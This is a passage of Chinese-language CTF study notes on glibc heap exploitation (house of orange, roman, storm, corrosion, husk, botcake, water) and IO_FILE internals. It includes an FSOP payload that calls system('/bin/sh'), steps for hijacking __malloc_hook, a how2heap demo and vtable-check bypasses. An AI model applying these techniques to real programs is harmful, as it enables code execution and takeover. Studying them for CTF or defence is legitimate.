bk = fake_chunk_2_prev_size_addr

fake_chunk2

fd = fake_chunk_1_prev_size_addr


具体实现：

申请一个smallbin范围堆块(victim)，伪造fake_chunk_1、fake_chunk_2
释放victim，申请一个更大的堆块，再修改victim-&gt;bk为fake_chunk_1_prev_size_addr
再申请一个与victim同样大小的堆，将fake_chunk链入smallbin，触发(smallbin-&gt;bk = victim-&gt;bk=stack_buffer1_addr)
再申请一个与victim同样大小的堆，即可得到fake_chunk_1

利用前提

UAF
能获得堆地址甚至需要其他地址

Step 1 
Step 2 
Step 3 
Step 4 

house of orange

版本：2.23~2.26
效果：任意函数/命令执行
特点：无free
利用过程：

先利用溢出等方式进行篡改top chunk的size
然后申请一个大于top chunk的size
实现了将堆块放入unsortedbin

伪造结构：

nb表示申请堆块大小
MINSIZE&lt;old_top_size&lt;nb+MINSIZE
old_top_size的prev_size位是1
(old_top_size+old_top)&amp;0xfff=0x000
nb&lt;0x20000

unsortedbin attack

往一个指定地址里写入一个很大的数（main_arena+88或main_arena+96）
实现：

向unsortedbin的尾部chunk的bk指针写入target_addr-0x10

完成了unsortedbin attack后将无法从unsortedbin中获得堆块了

FSOP

原理：

篡改_IO_list_all和_chain，来劫持IO_FILE结构体，让IO_FILE结构体落在我们可控的内存上，然后在FSOP中我们使用_IO_flush_all_lockp来刷新_IO_list_all链表上的所有文件流，也就是对每个流都执行一下fflush，而fflush最终调用了vtable中的_IO_overflow
而前面提到了，我们将IO_FILE结构体落在我们可控的内存上，这就意味着我们是可以控制vtable的，我们将vtable中的_IO_overflow函数地址改成system地址即可，而这个函数的第一个参数就是IO_FILE结构体的地址，因此我们让IO_FILE结构体中的flags成员为/bin/sh字符串，那么当执行exit函数或者libc执行abort流程时或者程序从main函数返回时触发了_IO_flush_all_lockp即可拿到shell

布局

篡改_IO_list_all为main_arena+88这个地址，chain字段是首地址加上0x68偏移得到的，因此chain字段决定了下一个IO_FILE结构体的地址为main_arena+88+0x68，这个地址恰好是smallbin中size为0x60的数组
将一个chunk放到这个smallbin中size为0x60的链上，那么篡改_IO_list_all为main_arena+88这个地址后，smallbin中的chunk就是IO_FILE结构体了，
将其申请出来后可以控制这块内存从而伪造vtable字段进行布局最终拿到shell

检查绕过

mode=0
_IO_write_ptr=1
_IO_write_base=0
_flag=/bin/sh

成功概率只有50%
glibc-2.24后加入vtable的check，但可以利用IO_str_jumps结构利用
unsortedbin attack和FSOP攻击都是构造数据在一个payload里的


payload=b&#x27;f&#x27;*0x400payload+=p64(0)+p64(0x21)payload+=p64(sys_addr)+p64(0)payload+=b&#x27;/bin/sh\x00&#x27;+p64(0x61) #old top chunk prev_size &amp; size 同时也是fake file的_flags字段payload+=p64(0)+p64(io_list_all-0x10) #old top chunk fd &amp; bkpayload+=p64(0)+p64(1)#_IO_write_base &amp; _IO_write_ptrpayload+=p64(0)*7payload+=p64(leak_heap+0x430)#chain-&gt;old top chunk addrpayload+=p64(0)*13payload+=p64(leak_heap+0x508)#vtablepayload+=p64(0)+p64(0)+p64(sys_addr)#DUMMY finish overflow
     if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)   || (_IO_vtable_offset (fp) == 0       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))   )  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)result = EOF;
 
house of rabbit

版本：2.23~2.31
目的：获得某块内存的任意写
核心：利用 fastbin consolidate 使 fastbin 中的 fake chunk 合法化
利用方式：

修改fd

申请 chunk A (fastbin)、chunk B (smallbin)
释放 chunk A，修改 A-&gt;fd 指向地址 X
free chunk B使fake chunk 被放到了 unsortedbin
分配足够大的 chunk等能触发 malloc_consolidate 使fake chunk 进入到对应的 smallbin/largebin
取出 fake chunk 进行读写即可

堆叠

利用前提

UAF
fastbin的fd或size域可写
超过0x400大小的堆分配


house of roman

版本：2.23~2.29
目的：getshell
利用方式：

Step 1

构造chunk

chunk_0：size=0x70

fastbin_victim
UAF

chunk_1：size=0x90

使chunk_2页对齐

chunk_2：size=0x90

main_arena_use
unsortedbin

chunk_3：size=0x70

relative_offset_heap
写相对地址


free(chunk_2)
malloc(0x60)

chunk_2-&gt;chunk_2_1(0x70,fake_libc_chunk)+chunk_2_2(0x20,leftover_main,unsortedbin)

free(chunk_3)+free(chunk_0)，都在fastbin
edit(chunk_0-&gt;fd=fake_libc_chunk_prev_size_addr)
edit(fake_libc_chunk-&gt;fd=__malloc_hook-0x23)

爆破

malloc(0x60)*3

Step 2

malloc(chunk_4,size=0x90)+malloc(0x30)
free(chunk_4)
edit(chunk_4-&gt;bk=__malloc_hook-0x10)
malloc(malloc_hook_chunk,size=0x90)
edit(malloc_hook_chunk-&gt;fd=ogg_addr)


利用前提

UAF
不需要泄露地址
爆破16位，1/40960


house of storm

版本：2.23~2.29
目的：任意地址写
伪造结构

unsorted_bin-&gt;fd = 0

unsorted_bin-&gt;bk = fake_chunk

large_bin-&gt;fd = 0

large_bin-&gt;bk = fake_chunk+8

large_bin-&gt;fd_nextsize = 0
large_bin-&gt;bk_nextsize = fake_chunk - 0x18 -5

利用方式：

chunk_1：size=0x410
chunk_2：size=0x30
chunk_3：size=0x420
chunk_4：size=0x30
chunk_5：size=0x30
chunk_6：size=0x30
free(chunk_1)+free(chunk_3)+free(chunk_5)
malloc(chunk_5)
malloc(chunk_3)+free(chunk_3)
edit(chunk_3-&gt;bk=__malloc_hook-0x50)
edit(chunk_1-&gt;bk=__malloc_hook-0x50+8)
edit(chunk_1-&gt;bk_nextsize=__malloc_hook-0x50-0x18-5)
malloc(0x48)(__malloc_hook_chunk)
edit(__malloc_hook_chunk+0x40=ogg_addr)
malloc-&gt;getshell

利用前提

UAF
unsortedbin attack、largebin attack


house of corrosion

版本：2.23~
目的：任意地址读写，任意地址值转移
伪造结构

chunk size = (target_addr - &amp;main_arena.fastbinsY) x 2 + 0x20

利用方式：

读target_addr的target_message

释放fastbin A到target_addr使A-&gt;fd指向target_message

写target_message到target_addr

malloc(A,size=chunk size)
unsortedbin attack change global_max_fast
free(A)
使A-&gt;fd为target_message
malloc(A)

转移attack_addr的target_message到target_addr地址上

src_size=(attack_addr-fastbinY)*2+0x20
dst_size=(target_addr-fastbinY)*2+0x20
malloc(A,size=dst_size)
malloc(B,size=dst_size)
free(B)
free(A)
unsortedbin attack change global_max_fast
使attack_addr的fd指向的堆A的fd指向自己
malloc(A)，edit(A-&gt;size=src_size)，free(A)
此时A落入target_addr的fd指针值变成target_message
edit(A-&gt;size=dst_size)，落入target_message，malloc(A)


利用前提

UAF、堆溢出
不需要泄露地址，爆破1/16
任意大小分配
可以修改global_max_fast


house of husk

版本：2.23~2.35
目的：backdoor or getshell
伪造结构

__printf_function_table!=NULL
__printf_arginfo_table=control_addr
__printf_arginfo_table[spec]=backdoor_addr

执行顺序：

printf-&gt;vprintf-&gt;(if __printf_function_table!=NULL)printf_positional-&gt;__parse_one_specmb-&gt;(*__printf_arginfo_table[spec-&gt;info.spec])

利用方式：

unsortedbin leak libc、unsortedbin attack global_max_fast

利用前提

UAF、堆溢出
任意大小分配
可以修改global_max_fast

printf:

__vfprintf_internal

buffered_vfprintf

printf_positional

__parse_one_specmb

(*__printf_arginfo_table[spec-&gt;info.spec])




house of mind
house of muney
house of rusk
house of crust
house of io
house of botcake
通过第一次free进unsorted bin，第二次free进tcache bin构造chunk overlap，实现tcache中的double free，从而轻易实现tcache poisoning以进行后续攻击
以适当的大小（大于最大fastbin，小于等于最大Tcache）先malloc 7个chunk用于填充tcache，再分别malloc一个合并堆块prev，一个与前面7个相同大小的被攻击堆块victim，然后malloc一个任意大小chunk用于和top chunk分隔 void* chunks[7];  for(int i=0; i&lt;7; i++)&#123;      chunks[i]=malloc(0x80);  &#125;  void* prev=malloc(0x80);  void* victim=malloc(0x80);  malloc(0x10);
free掉前7个chunk，填满tcache；然后按顺序free掉victim和prev，触发prev与victim的合并
for(int i=0; i&lt;7; i++)&#123;      free(chunks[i]);  &#125;  free(victim);  free(prev);
malloc一个相同大小的chunk，使Tcache bin腾出一个位置 malloc(0x80);
再次free victim，此时victim进入Tcache，实现double free free(victim);
malloc一个合适大小（大于max(prev,victim)，小于等于prev+victim的chunk)，再malloc一个与victim相同大小的chunk，此时这两个chunk间存在重叠。
char* a=malloc(0x100);  char* b=malloc(0x80);  assert(a+0x100&gt;b);
house of water

在没有show的情况下可以利用UAF(EAF)并且可以申请超大堆块

how2heap演示 #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt;int main()&#123;    void *_ = NULL;    setbuf(stdin,NULL);    setbuf(stdout,NULL);    setbuf(stderr,NULL);        //step1:添加堆块0x3e8,0xf8之后依次释放,在tcache_perthread_struct上面伪造一个size 0x10001(在0x88偏移处)    void *fake_size_lsb = malloc(0x3d8);    void *fake_size_msb = malloc(0x3e8);    free(fake_size_lsb);    free(fake_size_msb);        void *metadata = (void *)((long) (fake_size_lsb &amp; -(0xfff)));        //填满0x90的tcache链，这样再申请最终大小为0x90堆块并释放后就会进入unsortedbin    void *x[7];    for(int i = 0 ; i &lt; 7 ; i ++)&#123;        x[i] = malloc(0x88);    &#125;        //间隔创建三个chunk，并且增加间隔防止合并，这三个chunk全部在unsortedbin的位置。然后创建了一个巨大的0xf000的chunk，用来填充到0x10001，目的是为了让最开始讲的tcache_perthread_struct那个0x10001作为size是合法的    void *unsorted_start = malloc(0x88);    _ = malloc(0x18);    void *unsorted_middle = malloc(0x88);    _ = malloc(0x18);    void *unsorted_end = malloc(0x88);    _ = malloc(0x18);    _ = malloc(0xf000);        //创建0x20大小的 chunk，并且伪造prev_size和下一个chunk的size：0x20    void *end_of_fake = malloc(0x18);    *(long *)end_of_fake = 0x10000;    *(long *)(end_of_fake + 0x8) = 0x20;        //填满 tcachebin    for(int i = 0 ; i &lt; 7 ; i ++)&#123;        free(x[i]);    &#125;        //在unsorted_start的上面设置了一个0x31的堆块并且释放，释放掉之后由于进入tcachebin会加入一个验证的key，这个key会覆盖掉原本unsorted_start的size，所以得还原    *(long *)(unsorted_start - 0x18) = 0x31;    free(unsorted_start - 0x10);    *(long *)(unsorted_start - 0x8) = 0x91;        //在unsorted_end的上面设置了一个0x21的堆块并且释放，释放掉之后由于进入tcachebin会加入一个验证的key，这个key会覆盖掉原本unsorted_start的size，所以得还原    *(long *)(unsorted_end - 0x18) = 0x21;    free(unsorted_end - 0x10);    *(long *)(unsorted_start - 0x8) = 0x91;        //在tcache_perthread_struct中，0x20大小的会在tcachebin的第一个位置，而0x30大小的会在tcachebin的第二个位置，于是就造成了0x10001这个值下面刚好是这么两个地址，这样的话，也就是说假设0x10001进入bin，那么它的fd指针将指向unsorted_end，而bk指针将指向unsorted_start        //释放了三个chunk，unsortedbin里会变成：unsorted_start-&gt;unsorted_middle-&gt;unsorted_end    free(unsorted_end);    free(unsorted_middle);    free(unsorted_start);        //将unsorted_start的fd指针变成fake_chunk，unsorted_end的bk指针变成fake_chunk    *(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);    *(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);        //unsortedbin变成了unsorted_start-&gt;fake_chunk-&gt;unsorted_end    //进行切割如果unsortebin 里面没有合适大小的块，则它会按顺序分配到smallbin或者largebin中，然后再进行切割，很明显这里会把unsorted_start和unsorted_end放入smallbin，而fakechunk进入largebin    //所以只要选择一个小于0x10000的块，这样在放入各自的bin之后，由于只有fakechunk进入了largebin，它一定会在某两个位置出现libc地址，而这两个位置会变成tcachebin的两个    //在此之后，如果申请相应大小的tcachebin的chunk，则会在libc上建立相应的堆块    void *meta_chunk = malloc(0x288);    assert(meta_chunk == (metadata+0x90));&#125; 接下来打_IO_FILE就行了，将flag设置为 0xfbad1800 ，目的是让他冲掉缓冲区，将内容输出出来 然后read_ptr,read_end,read_base这三项随意，设置为0，同时修改好 write_base write_ptr 和 write_end 然后他会输出从 write_base 到 write_ptr 中的内容
泄露libc后可以打house of apple
house of tangerine（house of orange plus)
house of minho
IO_FILE
IO数据结构
对于LBA硬盘来说，读写数据都必须一块一块的读，如果我们每次执行read，write时都是操作很少的数据，则对系统消耗非常大，因此，C库就想了一个好办法——缓冲区。所以，就比较好理解了，缓冲区是为了减少3坏操作外部硬件时的消耗产生的，一切都是以外部硬件为服务对象。
1.从外部硬件读取时。为了减少消耗，会一次从外部硬件读取一“块”数据，并放入缓冲区，然后当target需要时，再从头部慢慢读取，只到读完才再次从硬件读取。这个缓冲区叫输入缓冲区。 2.向外部硬件写入时。为了减少消耗，不会一有东西就写入，而是先将内容从source写入缓冲区，当缓冲区满了时候再将内存一起写入硬件。这个缓冲区叫输出缓冲区。
首先，以从外部硬件读取为例，我们要有输入缓冲区开始（base）、结尾（end）和当前（ptr）已经用了多少的指针。很明显当ptr == end时，说明输入缓冲区里的东西已经全部读完，需要重新从硬件读入。 同样，对于向外部硬件写入为例，我们要有输出缓冲区开始（base）、结尾（end）和当前（ptr）已经写了多少的指针。很明显当ptr == end时，说明输出缓冲区已经写满，可以向硬件写入了。
上面的内容看似非常清楚，但这里其实有一些比较容易混乱的地方。因为缓冲区内存储的是数据，输入、输出两者数据流动方向不同，但保护主体都一样，都是外部设备，所以有用的数据部分就有所不相同。 1. 对于输入缓冲区ptr-end是有用的数据，base-ptr为已使用的数据。 2. 对于输出缓冲区base-ptr是要写入硬件的内容（有用数据），ptr-end为空闲区域。 3. 两者结尾有所不同。 1. 对于输入缓冲区，因为从硬盘中读取的数据可能无法填满整个缓冲区的块，所以_IO_buf_end != _IO_read_end。输入缓冲区要使用_IO_read_end判断结束。 2. 对于输出缓冲区，缓冲区的结束就是输出缓冲区结束，_IO_buf_end == _IO_write_end。输出缓冲区往往使用_IO_buf_end判断结束。
虽然，输入、输出缓冲区作用不同，但原理上都是一块内存。一块外部设备可能既可以写入也可以读取，为了节省空间，我们可以定义一块缓冲区，需要输入的时候就做输入缓冲区，需要输出就做输出缓冲区。那么我们就有了8个指针。 char *_IO_buf_base;    //缓冲区的基地址char *_IO_buf_end;     //缓冲区的结束地址char *_IO_read_base;   //输入缓冲区基地址char *_IO_read_ptr;    //输入当前位置char *_IO_read_end;    //输入缓冲区结尾地址char *_IO_write_base;  //输出缓冲区基地址char *_IO_write_ptr;   //输出当前位置char *_IO_write_end;   //输出缓冲区结尾地址
从文件中读取 程序是从fd中读取一批数据到缓冲区中（_IO_buf_base 至 _IO_buf_end），_IO_read_ptr 指向已向target中写完的位置，既 _IO_read_ptr 至 _IO_read_end 为还没有写入target中的数据。当_IO_read_ptr == _IO_read_end时，说明输入缓冲区内已经没有可用数据，需要再次从文件中读入数据。
向文件输出 程序是先将source中的数据写入到缓冲区中，_IO_write_ptr 指向已从source中写到的位置，既 _IO_write_ptr 至 _IO_write_pend 为还剩余的空间。当_IO_write_ptr == _IO_buf_end时，再全部写入fd中。
IO数据操作
1.从硬盘中读入数据

从fd中读取一批（一块）数据到输入缓冲区中（_IO_buf_base 至 _IO_buf_end），同时对_IO_read_base _IO_read_ptr _IO_read_end 设置初始值。（_IO_read_ptr == _IO_read_base ，当然也可能不同）
从_IO_read_ptr 处向需要的内存中复制数据，同时把_IO_read_ptr 向后移位。
当_IO_read_ptr == _IO_read_end时，说明缓冲区内已经没有可用数据，需要再次从文件中读入数据。冲入第一步。

2.向硬盘中写入数据

先将source中的数据复制到输出缓冲区中，_IO_write_ptr 指向已写到的位置。
当_IO_write_ptr == _IO_buf_end时，将缓冲区中的内容全部写入fd中，并将_IO_write_ptr设置为 _IO_write_base，重复第一步。

3.申请缓冲区
申请一块缓冲区，并设置_IO_buf_base为开头，_IO_buf_end为结尾。
_IO_file_jumps 函数操作
1._IO_new_file_finish
是文件结束的操作，所以它的操作如下 1. 清空所有缓冲区 2. 关闭（close）文件
2._IO_new_file_overflow
主要是处理当输出缓冲区用完时，向硬盘写入数据
当然，其实这个函数内部非常复杂，加入了一些检测。例如，如果缓冲区不存在则要初始化缓冲区。并且，这个函数的参数中有一个标志位 1. 如果 ch == EOF，则输出f-&gt;_IO_write_ptr - f-&gt;_IO_write_base的区间。 2. 如果 ch != EOF，并且f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end，则将缓冲区全部输出。 3. 如果 ch == '\n'，则输出 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base加一个换行符。 4. 以上都不满足就返回ch
3._IO_new_file_underflow
这个函数与_IO_new_file_overflow差不多，主要是用于从硬盘中读取数据，每次读取都是_IO_buf_base至_IO_buf_end。
为了防止硬盘中没有这么多数据，设置_IO_read_end为读取的总数。如果，缓冲区不存在则要初始化缓冲区。程序返回_IO_read_ptr指针。
4.__GI__IO_default_uflow（_IO_default_uflow）
这个函数就是调用_IO_new_file_underflow，并简单做了一些检测。
5.__GI__IO_default_pbackfail（_IO_default_pbackfail）
设置存储的函数，暂不重要。
6._IO_new_file_xsputn
这个函数是主要目的是将数据从source放入输出输出缓冲区。显然，放入过程中还有几种情况。 1. 如果要写入的数据小于剩余的空间_IO_write_ptr - _IO_buf_end，那么就直接将数据写入输出缓冲区即可。 2. 如果要写入的数据大于剩余的空间_IO_write_ptr - _IO_buf_end。 1. 先将输出缓冲区填满，再调用_IO_new_file_overflow清空输出缓冲区。 2. 剩余的数据继续调用 _IO_new_file_xsputn
说明：我们平时的输出函数主要就是调用此函数。
7.__GI__IO_file_xsgetn（_IO_file_xsgetn）
这个函数是主要目的是将数据从输入缓冲区放入target。显然放入过程中还有几种情况。 1. 如果要读取的数据小于剩余的数据_IO_read_ptr - _IO_read_end，那么就直接将数据读取到target即可。 2. 如果要读取的数据大于剩余的数据_IO_read_ptr - _IO_read_end。 1. 先将输入缓冲区全部数据读出，再调用_IO_new_file_underflow从硬盘读入一块数据。 2. 如果需要读取数据特别多，就调用__GI__IO_file_read从硬盘直接读取数据。
说明：我们平时的输入函数主要就是调用此函数。
8._IO_new_file_seekoff
设置偏移函数，就是设置我们所说的ptr指针。
9._IO_default_seekpos
就是调用_IO_new_file_seekoff。
10._IO_new_file_setbuf
这个函数也比较简单，看名字就知道是设置缓冲区的，作用就是初始化各个缓冲区 1. _IO_write_base = _IO_write_ptr = _IO_write_end = _IO_buf_base 2. _IO_read_base = _IO_read_ptr = _IO_read_end = _IO_buf_base （使用 _IO_setg 宏）
11._IO_new_file_sync
同步函数，负责与硬盘和缓冲区之间进行同步。
12.__GI__IO_file_doallocate（_IO_default_doallocate）
这个就是申请缓冲区的函数，申请完之后还要把输入、输出缓冲区初始化。
13.GI__IO_file_read（_IO_file_read）
这个是输入的最终函数，它将syscall_read进行了一定的封装。
14._IO_new_file_write
这个是输出的最终函数，它将syscall_write进行了一定的封装。
15.GI__IO_file_seek（_IO_file_seek）
调用__lseek64。
16.__GI__IO_file_close（_IO_file_close）
就和名字一样，关闭文件。
17.__GI__IO_file_stat（_IO_file_stat）
获取文件描述符的状态。调用__fxstat64。
18._IO_default_showmanyc
此函数没用，返回-1。
19._IO_default_imbue
此函数没用。
20.其他一些内容
flag标志位
`#define _IO_MAGIC 0xFBAD0000 /* Magic number */``#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */``#define _IO_MAGIC_MASK 0xFFFF0000``#define _IO_USER_BUF 1 /* User owns buffer; don&#x27;t delete it on close. */``#define _IO_UNBUFFERED 2``#define _IO_NO_READS 4 /* Reading not allowed */``#define _IO_NO_WRITES 8 /* Writing not allowd */``#define _IO_EOF_SEEN 0x10``#define _IO_ERR_SEEN 0x20``#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&#x27;t call close(_fileno) on cleanup. */``#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/``#define _IO_IN_BACKUP 0x100``#define _IO_LINE_BUF 0x200``#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */``#define _IO_CURRENTLY_PUTTING 0x800``#define _IO_IS_APPENDING 0x1000``#define _IO_IS_FILEBUF 0x2000``#define _IO_BAD_SEEN 0x4000``#define _IO_USER_LOCK 0x8000`
flush（_IO_do_flush）
清空缓冲区，将输出缓冲区清空。
全部清空函数（fflush）
# define fflush(s) _IO_fflush (s)  //  /assert/assert.c// /libio/iofflush.cint _IO_fflush (FILE *fp)&#123;  if (fp == NULL)    return _IO_flush_all ();  else    &#123;      int result;      CHECK_FILE (fp, EOF);      _IO_acquire_lock (fp);      result = _IO_SYNC (fp) ? EOF :0;      _IO_release_lock (fp);      return result;    &#125;&#125;libc_hidden_def (_IO_fflush)
可以看出 fflush函数在参数为空时，清空(_IO_flush_all_lockp =&gt; _IO_OVERFLOW)全部文件；不为空时，同步(sync)指定文件，两种情况执行步骤不同。
缓冲区设置宏
_IO_setg _IO_setp 等等
虚表检测
虚表检测是2.24之后加入的内容，IO_validate_vtable检测如果虚表超出范围就进入_IO_vtable_check函数。各路大神找到的house很多都不是打file的跳表，而是其他处理跳表，但都差不太多。简要梳理如下。

2.23 的没有任何限制，可以将vtable 劫持在堆上并修改其内容，然后触发FSOP，
2.24 引入了vtable check，使得将vtable 整体劫持到堆上已不可能，大佬发现可以使用内部的vtable中_IO_str_jumps或_IO_wstr_jumps来进行利用。
2.31 中将_IO_str_finish函数中强制执行free函数，导致无法使用上述问题，因而催生出其他调用链。

虚表范围
虚表位置判断主要在IO_validate_vtable函数，2.37以前判断区间为_IO_helper_jumps - _IO_str_jumps之间的区域 0xd60，里面有以下虚表 _IO_helper_jumps_IO_helper_jumps_IO_cookie_jumps_IO_proc_jumps_IO_str_chk_jumps_IO_wstrn_jumps_IO_wstr_jumps_IO_wfile_jumps_maybe_mmap_IO_wfile_jumps_mmap__GI__IO_wfile_jumps_IO_wmem_jumps_IO_mem_jumps_IO_strn_jumps_IO_obstack_jumps_IO_file_jumps_maybe_mmap_IO_file_jumps_mmap__GI__IO_file_jumps_IO_str_jumps
攻击_IO_vtable_check
在IO_validate_vtable函数检查如果虚表超出范围，会进入_IO_vtable_check函数， void attribute_hidden _IO_vtable_check (void)&#123;#ifdef SHARED  /* Honor the compatibility flag.  */  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE  PTR_DEMANGLE (flag);#endif  if (flag == &amp;_IO_vtable_check) //检查是否是外部重构的vtable    return; 只是要满足一定条件。那么我们还是可以绕过虚表检测的 1. 泄露ptr_guard，反算IO_accept_foreign_vtables然后修改。 2. 因为IO_accept_foreign_vtables中基本都是0，直接将ptr_guard修改为&amp;_IO_vtable_check也可以。 但无论如何我们都需要有ld文件
外置虚表
check_stdfiles_vtables函数是设置外置虚表的函数，如果能执行这个函数，也可以绕过虚表检测 static void  check_stdfiles_vtables (void)&#123;  if (_IO_2_1_stdin_.vtable != &amp;_IO_file_jumps      || _IO_2_1_stdout_.vtable != &amp;_IO_file_jumps      || _IO_2_1_stderr_.vtable != &amp;_IO_file_jumps)    IO_set_accept_foreign_vtables (&amp;_IO_vtable_check);&#125;
IO_FILE结构体
_IO_FILE_plus
0x0   _flags0x8   _IO_read_ptr0x10  _IO_read_end0x18  _IO_read_base0x20  _IO_write_base0x28  _IO_write_ptr0x30  _IO_write_end0x38  _IO_buf_base0x40  _IO_buf_end0x48  _IO_save_base0x50  _IO_backup_base0x58  _IO_save_end0x60  _markers0x68  _chain0x70  _fileno0x74  _flags20x78  _old_offset0x80  _cur_column0x82  _vtable_offset0x83  _shortbuf0x88  _lock0x90  _offset0x98  _codecvt0xa0  _wide_data0xa8  _freeres_list0xb0  _freeres_buf0xb8  __pad50xc0  _mode0xc4  _unused20xd8  vtable
_IO_wide_data
/* Extra data for wide character streams.  */struct _IO_wide_data&#123;  wchar_t *_IO_read_ptr;	/* Current read pointer */  wchar_t *_IO_read_end;	/* End of get area. */  wchar_t *_IO_read_base;	/* Start of putback+get area. */  wchar_t *_IO_write_base;	/* Start of put area. */  wchar_t *_IO_write_ptr;	/* Current put pointer. */  wchar_t *_IO_write_end;	/* End of put area. */  wchar_t *_IO_buf_base;	/* Start of reserve area. */  wchar_t *_IO_buf_end;		/* End of reserve area. */  /* The following fields are used to support backing up and undo. */  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */  wchar_t *_IO_backup_base;	/* Pointer to first valid character of				   backup area */  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */  __mbstate_t _IO_state;  __mbstate_t _IO_last_state;  struct _IO_codecvt _codecvt;  wchar_t _shortbuf[1];  const struct _IO_jump_t *_wide_vtable;&#125;;
_IO_wstrn_jumps
const struct _IO_jump_t _IO_wstrn_jumps attribute_hidden =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT_DUMMY2,  JUMP_INIT(finish, _IO_wstr_finish),  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),  JUMP_INIT(xsputn, _IO_wdefault_xsputn),  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),  JUMP_INIT(seekoff, _IO_wstr_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_default_setbuf),  JUMP_INIT(sync, _IO_default_sync),  JUMP_INIT(doallocate, _IO_wdefault_doallocate),  JUMP_INIT(read, _IO_default_read),  JUMP_INIT(write, _IO_default_write),  JUMP_INIT(seek, _IO_default_seek),  JUMP_INIT(close, _IO_default_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue)&#125;;
_IO_obstack_jumps
/* the jump table.  */const struct _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, NULL),  JUMP_INIT(overflow, _IO_obstack_overflow),  JUMP_INIT(underflow, NULL),  JUMP_INIT(uflow, NULL),  JUMP_INIT(pbackfail, NULL),  JUMP_INIT(xsputn, _IO_obstack_xsputn),  JUMP_INIT(xsgetn, NULL),  JUMP_INIT(seekoff, NULL),  JUMP_INIT(seekpos, NULL),  JUMP_INIT(setbuf, NULL),  JUMP_INIT(sync, NULL),  JUMP_INIT(doallocate, NULL),  JUMP_INIT(read, NULL),  JUMP_INIT(write, NULL),  JUMP_INIT(seek, NULL),  JUMP_INIT(close, NULL),  JUMP_INIT(stat, NULL),  JUMP_INIT(showmanyc, NULL),  JUMP_INIT(imbue, NULL)&#125;;
IO_FILE结构体的调用
初始化
初始情况下 _IO_FILE 结构有 * _IO_2_1_stderr_  * _IO_2_1_stdout_ * _IO_2_1_stdin_  通过 _IO_list_all 将这三个结构连接，_chain指向下一个结构体 * _IO_list_all-&gt;_IO_2_1_stderr_-&gt;_IO_2_1_stdour_-&gt;_IO_2_1_stdin_ 并且存在 3 个全局指针 * stdin指向 _IO_2_1_stdin_ * stdout指向_IO_2_1_stdout_ * stderr指向_IO_2_1_stderr_  存在函数指针结构体vatble，存放着各种 IO 相关的函数的指针 [[./_IO_list_all1.png]] ### fopen  * fopen  * _IO_new_fopen  * __fopen_internal  * malloc创建lock_FILE结构体  * _IO_no_init对结构体进行null初始化  * _IO_file_init将结构体链入_IO_list_all  * _IO_file_open执行系统调用打开文件
fread

fread
_IO_sgetn
_IO_file_xsgetn
若缓冲区没有初始化则调用_IO_doallocbuf-&gt;_IO_file_doallocate初始化IO缓冲区，申请一块堆，只初始化_IO_buf_base、_IO_buf_end
若缓冲区有数据未复制到buf，则在buf数据总量不超过所需数据的前提下尽可能多把数据复制到buf中
若缓存区长度小于所需数据长度则重置缓冲区读写指针
_underflow调用系统函数_IO_SYSREAD向buf读入数据

pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x555555559000Size: 0x290 (with flag bits: 0x291)Allocated chunk | PREV_INUSEAddr: 0x555555559290Size: 0x1e0 (with flag bits: 0x1e1)Allocated chunk | PREV_INUSEAddr: 0x555555559470Size: 0x1010 (with flag bits: 0x1011)Top chunk | PREV_INUSEAddr: 0x55555555a480Size: 0x1fb80 (with flag bits: 0x1fb81)pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0$2 = &#123;  file = &#123;    _flags = -72539000,    _IO_read_ptr = 0x0,    _IO_read_end = 0x0,    _IO_read_base = 0x0,    _IO_write_base = 0x0,    _IO_write_ptr = 0x0,    _IO_write_end = 0x0,    _IO_buf_base = 0x555555559480 &quot;&quot;,    _IO_buf_end = 0x55555555a480 &quot;&quot;,    _IO_save_base = 0x0,    _IO_backup_base = 0x0,    _IO_save_end = 0x0,    _markers = 0x0,    _chain = 0x7ffff7e044e0 &lt;_IO_2_1_stderr_&gt;,    _fileno = 3,    _flags2 = 0,    _old_offset = 0,    _cur_column = 0,    _vtable_offset = 0 &#x27;\000&#x27;,    _shortbuf = &quot;&quot;,    _lock = 0x555555559380,    _offset = -1,    _codecvt = 0x0,    _wide_data = 0x555555559390,    _freeres_list = 0x0,    _freeres_buf = 0x0,    __pad5 = 0,    _mode = 0,    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;  &#125;,  vtable = 0x7ffff7e02030 &lt;_IO_file_jumps&gt;&#125;pwndbg&gt; tele 0x5555555592a000:0000│ rbx 0x5555555592a0 ◂— 0xfbad248801:0008│     0x5555555592a8 ◂— 0... ↓        5 skipped07:0038│     0x5555555592d8 —▸ 0x555555559480 ◂— 0pwndbg&gt;08:0040│     0x5555555592e0 —▸ 0x55555555a480 